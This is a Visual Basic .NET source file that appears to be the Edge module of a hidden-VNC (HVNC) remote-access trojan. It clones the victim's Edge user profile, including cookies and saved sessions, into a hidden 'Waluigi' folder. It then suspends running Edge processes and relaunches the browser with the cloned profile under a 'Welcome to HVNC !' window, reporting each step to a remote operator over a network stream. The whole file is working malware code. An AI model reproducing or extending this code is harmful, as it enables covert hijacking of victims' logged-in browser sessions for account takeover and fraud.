Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports DLL.Functions
Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Windows.Forms
Imports System.Drawing
Imports System.Runtime.InteropServices

Namespace DLL.Browser
	Public Class Edge

		<DllImport("user32.dll", EntryPoint:="SetWindowPos")>
		Public Shared Function SetWindowPos(ByVal hWnd As IntPtr, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal Y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As IntPtr
		End Function

		Private Const SWP_NOMOVE As Short = &H2
		Private Const SWP_NOSIZE As Short = 1
		Private Const SWP_NOZORDER As Short = &H4
		Private Const SWP_SHOWWINDOW As Integer = &H40

		Public Shared Sub StartEdge(ByVal duplicate As Boolean)
			Try
				If Conversions.ToBoolean(Outils.IsFileOpen(New FileInfo(Interaction.Environ("localappdata") & "\Microsoft\Edge\Waluigi\lockfile"))) Then
					Outils.SendInformation(Outils.nstream, "25|Edge has already been opened!")
					Return
				End If
				If duplicate Then
					Outils.SendInformation(Outils.nstream, "22|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\Microsoft\Edge\User Data")) / 1024.0 / 1024.0)))
					Dim monitorDirSize As New MonitorDirSize()
					monitorDirSize.StartMonitoring(Interaction.Environ("localappdata") & "\Microsoft\Edge\Waluigi")
					Try
						Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") & "\Microsoft\Edge\User Data", Interaction.Environ("localappdata") & "\Microsoft\Edge\Waluigi", overwrite:=True)
					Catch projectError As Exception
						ProjectData.SetProjectError(projectError)
						ProjectData.ClearProjectError()
					End Try
					monitorDirSize.StopMonitoring()
					Outils.SendInformation(Outils.nstream, "204|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\Microsoft\Edge\User Data")) / 1024.0 / 1024.0)))
				Else
					Outils.SendInformation(Outils.nstream, "205|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\Microsoft\Edge\User Data")) / 1024.0 / 1024.0)))

				End If
				Dim processesByName() As Process = Process.GetProcessesByName("msedge")
				For Each process As Process In processesByName
					Outils.SuspendProcess(process)
				Next process
				Process.Start("msedge", "--user-data-dir=""" & Interaction.Environ("localappdata") & "\Microsoft\Edge\Waluigi"" ""data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>"" --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle()
				Dim stopwatch As Stopwatch = New Stopwatch()
				stopwatch.Start()

				While Outils.FindHandle("Welcome to HVNC !") = Nothing
					Dim secondMonitor As Rectangle = Screen.AllScreens(0).WorkingArea
					SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER Or SWP_SHOWWINDOW)
					Application.DoEvents()

					If stopwatch.ElapsedMilliseconds >= 10000 Then
						Return
					End If
				End While

				stopwatch.[Stop]()
				Dim processesByName2 As Process() = Process.GetProcessesByName("msedge")

				For Each process2 As Process In processesByName2
					Outils.ResumeProcess(process2)
				Next

			Catch projectError2 As Exception
				ProjectData.SetProjectError(projectError2)
				ProjectData.ClearProjectError()
			End Try
		End Sub
	End Class
End Namespace